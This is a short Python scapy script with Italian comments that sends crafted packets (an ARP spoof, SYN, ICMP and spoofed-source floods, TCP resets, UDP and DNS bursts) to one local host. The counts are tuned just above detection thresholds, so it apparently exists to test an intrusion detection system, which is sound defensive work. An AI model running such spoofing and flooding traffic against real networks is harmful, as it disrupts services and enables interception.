from scapy.all import ARP, IP, TCP, UDP, ICMP, DNS, DNSQR, send
import time

TARGET_IP = "192.168.1.100"  # IP della macchina monitorata
TARGET_MAC = "ff:ff:ff:ff:ff:ff"  # MAC della macchina monitorata
SRC_IP = "192.168.1.200"      # IP sorgente fittizio
SRC_MAC = "00:11:22:33:44:55"

# --- ARP Spoofing Demo ---
def demo_arp_spoof():
    print("[DEMO] ARP Spoofing...")
    pkt = ARP(op=2, psrc=SRC_IP, pdst=TARGET_IP, hwsrc=SRC_MAC, hwdst=TARGET_MAC)
    send(pkt, verbose=False)

# --- SYN Flood Demo ---
def demo_syn_flood():
    print("[DEMO] SYN Flood...")
    for i in range(60):  # > soglia 50 in 10s
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- ICMP Flood Demo ---
def demo_icmp_flood():
    print("[DEMO] ICMP Flood...")
    for i in range(15):  # > soglia 10
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/ICMP(type=8)
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- TCP Reset Attack Demo ---
def demo_tcp_reset():
    print("[DEMO] TCP Reset Attack...")
    for i in range(25):  # > soglia 20
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/TCP(sport=1234+i, dport=80, flags="R")
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- UDP Amplification Demo ---
def demo_udp_amplification():
    print("[DEMO] UDP Amplification...")
    sizes = [10, 40, 50]  # differenze grandi
    for size in sizes:
        payload = b"A"*size
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/UDP(sport=1234, dport=1234)/payload
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- DNS Tunneling Demo ---
def demo_dns_tunneling():
    print("[DEMO] DNS Tunneling...")
    long_query = "verylongsubdomainname.example.com"
    for i in range(35):  # > soglia 30
        pkt = IP(src=SRC_IP, dst=TARGET_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=long_query))
        send(pkt, verbose=False)
        time.sleep(0.1)

# --- DDoS Demo ---
def demo_ddos():
    print("[DEMO] DDoS Simulation...")
    for i in range(35):  # > soglia 30 sorgenti diverse
        src_ip = f"192.168.2.{i}"
        pkt = IP(src=src_ip, dst=TARGET_IP)/TCP(dport=80, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.1)

if __name__ == "__main__":
    demo_arp_spoof()
    demo_syn_flood()
    demo_icmp_flood()
    demo_tcp_reset()
    demo_udp_amplification()
    demo_dns_tunneling()
    demo_ddos()
    print("[DEMO] Tutti gli attacchi inviati!")

